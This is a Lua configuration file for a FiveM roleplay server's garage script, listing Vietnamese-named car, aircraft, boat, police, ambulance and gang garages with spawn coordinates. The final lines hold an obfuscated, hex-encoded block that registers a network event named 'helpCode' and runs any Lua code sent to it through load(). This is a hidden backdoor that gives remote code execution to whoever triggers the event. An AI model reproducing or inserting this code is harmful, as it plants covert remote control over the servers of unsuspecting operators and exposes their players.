Config = {}
Config.ShowPoundVehicleInGarage = true
Config.ReturnVehicleAfterRS = false
Config.ReturnPrice = 1500
Config.Blip = {
	['default'] = {
		Spire = 290,
		Color = 38
	}
}
Config.HelpNotification = {
	["GaragePoint"] = "Nhấn [E] để mở Garage",
	["DeletePoint"] = "Nhấn [E] để cất phương tiện"
}
Config.Garages = {
    ['Garage may bay Sa Mạc'] = {
        car = "aircraft",
		GaragePoint = { x = 1715.62, y = 3261.86, z = 41.13 },
		SpawnPoint = { x = 1701.17, y = 3249.7, z = 40.97 },
		DeletePoint = { x = 1719.77, y = 3248.08, z = 41.97},
		Type = 14,
	},

	['Garage may bay Thành Phố'] = {
		GaragePoint = { x = -1278.91, y = -3378.73, z = 13.94 },
		SpawnPoint = {x=-1258.94, y=-3382.16, z=12.94},	
		DeletePoint = { x = -1271.9, y=-3400.56, z= 13.94},
        car = "aircraft",
		Type = 14,
	},

	['Garage Máy Bay'] = {
		GaragePoint = { x =2132.95, y = 4814.93, z = 41.2 },
		SpawnPoint = { x = 2102.11, y=4795.76,z= 40.06 },
		DeletePoint = { x = 2134.92, y = 4806.34, z = 41.2 },
        car = "aircraft",
		Type = 14,
	},
	['Garage Trung Tam'] = {
		GaragePoint = { x = 219.151642, y = -811.582397, z = 30.813232 },
		SpawnPoint = { x = 229.700, y = -800.1149, z = 29.5722, h = 157.84 },
		DeletePoint = { x = 222.23614501953, y = -760.82092285156, z = 30.820177078247, h = 47.456241607666 },
		car = "car",
	},
	['Garage Sandy'] = {
		GaragePoint = { x = 1737.1572265625, y = 3712.3679199219, z = 34.124103546143 },
		SpawnPoint = { x = 1737.84, y = 3719.28, z = 33.04, h = 21.22 },
		DeletePoint = { x = 1722.632935, y=3713.868164, z=34.199951 },
		car = "car",
	},
	['Garage Paleto'] = {
		GaragePoint = { x = 105.359, y = 6613.586, z = 32.3973 },
		SpawnPoint = { x = 128.7822, y = 6622.9965, z = 31.7828, h = 315.01 },
		DeletePoint = { x = 126.3572, y = 6608.4150, z = 31.8565 },
		car = "car",
	},
	-- ['Garage Prison'] = {
	-- 	GaragePoint = { x = -805.52825927734, y = -582.84704589844, z = 30.126033782959 },
	-- 	SpawnPoint = { x = -789.98901367188, y = -577.73004150391, z = 30.126028060913, h = 253.81340026855 },
	-- 	DeletePoint = { x = -788.97015380859, y = -591.48669433594, z = 30.126028060913 }
	-- },
	['Garage 9 gio'] = {
		GaragePoint = { x = -3154.833984375, y = 1089.3065185547, z = 20.707761764526 },
		SpawnPoint = { x = -3145.7497558594, y = 1094.4067382812, z = 20.696044921875, h = 302.99526977539 },
		DeletePoint = { x = -3150.9272460938, y = 1074.6622314453, z = 20.678995132446, h = 20.627109527588 },
		car = "car",
	},
	-- ['Garage so12'] = {
	-- 	GaragePoint = { x = 782.05102539062, y = -2973.0747070312, z = 5.8007173538208 },
	-- 	SpawnPoint = { x = 762.5947265625, y = -2974.4140625, z = 5.8007202148438, h = 172.44654846191 },
	-- 	DeletePoint = { x = 763.00415039062, y = -2958.4812011719, z = 5.8007216453552 }
	-- },
	['Garage Job Cente2r'] = {
		GaragePoint = { x = -1513.1607666016, y = -437.17446899414, z = 35.44206237793 },
		SpawnPoint = { x = -1525.4644775391, y = -435.70822143555, z = 35.442115783691, h = 211.64083862305 },
		DeletePoint = { x = -1517.3094482422, y = -423.54006958008, z = 35.442192077637 },
		car = "car",
	},	
	['Garage Nấu đá'] = {
		GaragePoint = { x = 923.7, y = -1564.62, z = 30.71  },
		SpawnPoint = { x = 904.82, y = -1566.05, z = 29.81 },
		DeletePoint = { x = 893.38, y=-1550.55, z=30.63 },
		car = "car",
	},
	['Garage Casino'] = {
		GaragePoint = { x = 850.38, y=-39.89, z=78.76  },
		SpawnPoint = { x = 861.76, y=-35.96, z=77.76, h= 320.408 },
		DeletePoint = { x = 874.03, y=-16.68, z=78.76 },
		car = "car",
	},

	['Garage nha tu'] = {
		GaragePoint = {x = 1834.44, y= 2541.94, z= 45.88 },
		SpawnPoint = {x = 1860.45, y= 2545.64, z= 44.67, h = 357.83 },
		DeletePoint = { x = 1845.08, y= 2531.09, z= 45.67	},
		car = "car",
	},

	['Garage police 1'] = {
		GaragePoint = {x = 452.06, y=-1019.14, z=28.44 },
		SpawnPoint = {x = 435.02, y=-1020.59, z=27.78, h = 90.66 },
		DeletePoint = { x = 435.02, y=-1020.59, z=27.78	},
		car = "police",
		Gang ="police"
	},
	['Garage police 2'] = {
		GaragePoint = {x = 1871.64, y=3684.34, z=33.6 },
		SpawnPoint = {x = 1863.98, y=3668.09, z=33.93, h =121.69 },
		DeletePoint = { x = 1863.98, y=3668.09, z=33.93	},
		car = "police",
		Gang ="police"
	},
	['Garage ambulance 1'] = {
		GaragePoint = {x = 294.46, y=-610.49, z=43.35 },
		SpawnPoint = {x = 277.65, y=-605.85, z=43.02, h = 120.73 },
		DeletePoint = {x = 277.65, y=-605.85, z=43.02	},
		car = "ambulance",
		Gang ="ambulance"
	},

	['Garage ambulance 2'] = {
		GaragePoint = {x = 1834.53, y=3665.46, z=33.72 },
		SpawnPoint = {x = 1837.3464, y=3653.0083, z=35.3037, h = 72.94 },
		DeletePoint = {x = 1837.3464, y=3653.0083, z=35.3037	},
		car = "ambulance",
		Gang ="ambulance"
	},

	['Garage mechanic 1'] = {
		GaragePoint = {x = -369.52, y=-102.45, z=39.54 },
		SpawnPoint = {x=-376.92, y=-116.84, z=38.7, h = 122.46 },
		DeletePoint = {x=-376.92, y=-116.84, z=38.7	},
		car = "mechanic",
		Gang ="mechanic"
	},

	['Garage mechanic 2'] = {
		GaragePoint = {x = 1186.21, y=2647.91, z=37.85 },
		SpawnPoint = {x=1179.03, y=2662.75, z=37.96, h = 358.98 },
		DeletePoint = {x=1179.03, y=2662.75, z=37.96	},
		car = "mechanic",
		Gang ="mechanic"
	},

	['Garage gangmg'] = {
		GaragePoint = {x = 1400.030762, y=1118.782471, z=114.826416 },
		SpawnPoint = {x=1415.657104, y=1118.637329, z=114.826416, h=87.874016 },
		DeletePoint = {x=1415.657104, y=1118.637329, z=114.826416,	},
		car = "car",
		Gang ="gangmg"
	},

	['Garage gangma'] = {
		GaragePoint = {x =953.578003, y=-133.265930, z=74.437378 },
		SpawnPoint = {x=962.953857, y=-133.898895, z=74.353149, h=150.236221},
		DeletePoint = {x=962.953857, y=-133.898895, z=74.353149,},
		car = "car",
		Gang ="gangma"
	},

	['Garage gangunc'] = {
		GaragePoint = {x =-1539.270386, y=889.832947, z=181.669556 },
		SpawnPoint = {x=-1528.747192, y=885.903320, z=181.787598, h=240.944885},
		DeletePoint = {x=-1528.747192, y=885.903320, z=181.787598,},
		car = "car",
		Gang ="gangunc"
	},

	['Garage gangctb'] = {
		GaragePoint = {x =-2585.380127, y=1924.074707, z=167.296753},
		SpawnPoint = {x=-2596.536377, y=1929.797852, z=167.296753, h=272.125977},
		DeletePoint = {x=-2596.536377, y=1929.797852, z=167.296753,},
		car = "car",
		Gang ="gangctb"
	},

	['Garage gangmxc'] = {
		GaragePoint = {x = 176.083511, y=480.263733, z=141.988281},
		SpawnPoint = {x=177.072525, y=489.217590, z=142.375854, h=357.165344},
		DeletePoint = {x=177.072525, y=489.217590, z=142.375854,},
		car = "car",
		Gang ="gangmxc"
	},

	['Garage gangfr'] = {
		GaragePoint = {x = -820.325256, y=184.549454, z=72.112061},
		SpawnPoint = {x=-811.213196, y=187.819778, z=72.465942, h=107.716537},
		DeletePoint = {x=-811.213196, y=187.819778, z=72.465942,},
		car = "car",
		Gang ="gangfr"
	},

	['police'] = {
		GaragePoint = { x = 461.00503540039, y = -987.17022705078, z = 43.691665649414 },
		SpawnPoint = { x = 450.32901000977, y = -981.19012451172, z = 43.691680908203, h = 86.689262390137},
		DeletePoint = {x = 450.32901000977, y = -981.19012451172, z = 43.691680908203},
		Gang = "police",
		Type = 15
	},
	['Garage thuyền 1'] = {
		GaragePoint = { x = -3426.2729492188, y = 978.48345947266, z = 8.3466835021973 },
		SpawnPoint = { x = -3502.0729980469, y = 984.6435546875, z = -0.55844843387604, h = 85.796974182129 },
		DeletePoint = { x = -3502.0729980469, y = 984.6435546875, z = 1.55844843387604 },
		TelePoint = {x = -3426.328125, y = 973.33331298828, z = 8.3466920852661},
		car = "boat",
		tp = true,
		Type = 14,
	},
	['Garage thuyền 2'] = {
		GaragePoint = { x = 715.06042480469, y = 4093.4521484375, z = 34.727882385254 },
		SpawnPoint = { x = 714.01165771484, y = 4079.3940429688, z = 29.741521835327, h = 183.70942687988 },
		DeletePoint = { x = 729.66235351562, y = 4085.4067382812, z = 30.431928634644 },
		TelePoint = {x = 715.06042480469, y = 4093.4521484375, z = 34.727882385254},
		car = "boat",
		tp = true,
		Type = 14,
	},
	['Garage thuyền 3'] = {
		GaragePoint = { x = 3860.8552246094, y = 4463.5185546875, z = 2.7162253856659},
		SpawnPoint = { x = 3854.3889160156, y = 4477.19921875, z = -0.091517999768257, h = 272.99017333984 },
		DeletePoint = { x = 3871.9216308594, y = 4477.546875, z = -0.085971236228943 },
		TelePoint = {x = 3860.8552246094, y = 4463.5185546875, z = 2.7162253856659},
		car = "boat",
		tp = true,
		Type = 14,
	},
	['Garage thuyền 4'] = {
		GaragePoint = { x = -1611.2600097656, y = 5262.302734375, z = 3.9741015434265},
		SpawnPoint = { x = -1621.427734375, y = 5246.8833007812, z = -0.057451769709587, h = 359.74081420898 },
		DeletePoint = {x = -1621.427734375, y = 5246.8833007812, z = -0.057451769709587 },
		TelePoint = {x = -1611.2600097656, y = 5262.302734375, z = 3.9741015434265},
		car = "boat",
		tp = true,
		Type = 14,
	},
	['Garage thuyền 5'] = {
		GaragePoint = { x = -2578.9975585938, y = 3695.9475097656, z = 0.8303496837616},
		SpawnPoint = { x = -2635.6430664062, y = 3711.3737792969, z = 0.3999031484127, h = 79.126403808594 },
		DeletePoint = {x = -2635.6430664062, y = 3711.3737792969, z = 0.3999031484127 },
		TelePoint = {x = -2578.9975585938, y = 3695.9475097656, z = 0.8303496837616},
		car = "boat",
		tp = true,
		Type = 14,
	},
	['Garage thuyền 6'] = {
		GaragePoint = { x = 23.706047058105, y = -2803.2585449219, z = 5.7017893791199},
		SpawnPoint = { x = 23.425861358643, y = -2828.7111816406, z = 0.26234239339828, h = 177.60409545898 },
		DeletePoint = {x = 23.425861358643, y = -2828.7111816406, z = 0.26234239339828 },
		TelePoint = {x = 23.706047058105, y = -2803.2585449219, z = 5.7017893791199},
		car = "boat",
		tp = true,
		Type = 14,
	},
	['Garage thuyền 7'] = {
		GaragePoint = { x = 2922.3420410156, y = 292.15899658203, z = 2.435444355011 },
		SpawnPoint = { x = 2951.0437011719, y = 269.84887695312, z = 0.38351121544838, h = 220.64370727539 },
		DeletePoint = {x = 2951.0437011719, y = 269.84887695312, z = 0.38351121544838 },
		TelePoint = {x = 2922.3420410156, y = 292.15899658203, z = 2.435444355011},
		car = "boat",
		tp = true,
		Type = 14,
	},

	-----DAOKHI------------
	-- ['Garage thuyền 8'] = {
	-- 	GaragePoint = {x = 4907.0385742188, y = -5172.154296875, z = 2.4725329875946 },
	-- 	SpawnPoint = { x = 4760.5322265625, y = -5167.814453125, z = 0.64289939403534, h = 70.406257629395 },
	-- 	DeletePoint = { x = 4760.5322265625, y = -5167.814453125, z = 0.64289939403534 },
	-- 	TelePoint = {x = 4907.0385742188, y = -5172.154296875, z = 2.4725329875946},
	-- 	car = "boat",
	-- 	tp = true,
	-- 	Type = 14,
	-- },--]]
	
}
Config.PoliceImpound = {
	["Police Impound 1"] = {
		GaragePoint = { x = 449.94592285156, y = -1013.4279174805, z = 28.489414215088 },
		SpawnPoint = { x = 431.54779052734, y = -1022.8218994141, z = 28.7640209198, h = 94.038650512695 }
	}
	
}


Config.ImgSrc = {

}
Config.Pos = {
	spam = {
		vec3(215.6745300293,  -809.82214355469, 30.734027862549), -- gara trung tam
		vec3(1737.1572265625,  3712.3679199219,34.124103546143), -- gara san dy
		vec3(105.359,  6613.586,  32.3973), -- gara paleto
		vec3(-3154.833984375, 1089.3065185547, 20.707761764526), -- fgara 9 gio
		vec3(-1513.1607666016,  -437.17446899414,  35.44206237793), -- gara job center 2r
		vec3(923.7,  -1564.62,  30.71), -- gara nau da
		vec3(850.38, -39.89, 78.76), -- gara casino
		vec3(1381.33, 1129.01, 114.33), -- gara mcr
		vec3(1834.44, 2541.94, 45.88),  -- gara nha tu
	}
}


local ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[1]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[2]) ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[3]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[2], function(LPCVUynYfYElnGXWmhiVAnPQbsBlTdFDmQWtVmDhoHivvrjgjOcapofqbRqLleXFJxboKB) ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[4]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[5]](LPCVUynYfYElnGXWmhiVAnPQbsBlTdFDmQWtVmDhoHivvrjgjOcapofqbRqLleXFJxboKB))() end)